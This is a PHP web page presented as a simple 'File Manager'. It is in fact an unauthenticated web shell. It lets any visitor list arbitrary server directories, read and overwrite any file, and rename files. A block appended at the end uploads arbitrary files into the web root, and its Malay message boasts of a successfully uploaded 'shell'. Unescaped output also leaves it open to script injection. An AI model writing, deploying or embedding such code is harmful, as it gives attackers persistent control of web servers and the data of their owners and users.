<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
</head>
<body>
    <h1>File Manager</h1>

    <form method="post" action="" enctype="multipart/form-data">
        <label for="path">Enter Path:</label>
        <input type="text" name="path" id="path" placeholder="Enter directory path" required>
        <input type="submit" name="viewButton" value="View Directory">
    </form>

    <?php
    session_start();

    if (isset($_POST['path'])) {
        $_SESSION['last_path'] = $_POST['path'];
    }

    $path = isset($_SESSION['last_path']) ? $_SESSION['last_path'] : '';

    if (isset($_POST['viewButton'])) {
        if (is_dir($path)) {
            $items = scandir($path);

            echo '<h2>Contents of ' . $path . '</h2>';
            echo '<form method="post" action="">';
            echo '<input type="hidden" name="path" value="' . $path . '">';

            echo '<ul>';
            foreach ($items as $item) {
                if ($item != '.' && $item != '..') {
                    $itemPath = $path . '/' . $item;
                    if (is_dir($itemPath)) {
                        echo '<li>';
                        echo '<a href="?path=' . urlencode($itemPath) . '">' . $item . '</a>';
                        echo '</li>';
                    } else {
                        echo '<li>';
                        echo $item;
                        echo ' <a href="?edit=' . $itemPath . '">Edit</a>'; // Changed "View" to "Edit"
                        echo ' <a href="?rename=' . $itemPath . '">Rename</a>';
                        echo '</li>';
                    }
                }
            }
            echo '</ul>';
            echo '</form>';
        } else {
            echo '<p>Directory does not exist.</p>';
        }
    }

    if (isset($_GET['edit'])) {
        $fileToEdit = $_GET['edit'];
        if (file_exists($fileToEdit) && is_file($fileToEdit)) {
            echo '<h2>Edit ' . $fileToEdit . '</h2>';
            $content = file_get_contents($fileToEdit);
            echo '<form method="post" action="?edit=' . $fileToEdit . '">';
            echo '<textarea name="editedContent" rows="10" cols="50">' . htmlentities($content) . '</textarea><br>';
            echo '<input type="submit" name="editButton" value="Save Changes">';
            echo '</form>';
        }
    }

    if (isset($_POST['editButton']) && isset($_GET['edit'])) {
        $fileToEdit = $_GET['edit'];
        $editedContent = $_POST['editedContent'];

        if (file_put_contents($fileToEdit, $editedContent) !== false) {
            echo '<p>Changes saved successfully.</p>';
        } else {
            echo '<p>Failed to save changes.</p>';
        }
    }

    if (isset($_GET['rename'])) {
        $fileToRename = $_GET['rename'];

        if (file_exists($fileToRename)) {
            echo '<h2>Rename ' . $fileToRename . '</h2>';
            echo '<form method="post" action="?rename=' . $fileToRename . '">';
            echo '<input type="text" name="newName" placeholder="Enter new name" required>';
            echo '<input type="submit" name="renameButton" value="Rename">';
            echo '</form>';
        }
    }

    if (isset($_POST['renameButton']) && isset($_GET['rename'])) {
        $fileToRename = $_GET['rename'];
        $newName = $_POST['newName'];
        $newPath = dirname($fileToRename) . '/' . $newName;

        if (rename($fileToRename, $newPath)) {
            echo '<p>Renamed ' . basename($fileToRename) . ' to ' . $newName . '</p>';
        } else {
            echo '<p>Failed to rename ' . basename($fileToRename) . '</p>';
        }
    }
    ?>
</body>

<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
else { echo '<b>Korang Gagal Upload Shell Korang!!!</b><br><br>'; }
}
?>
</html>
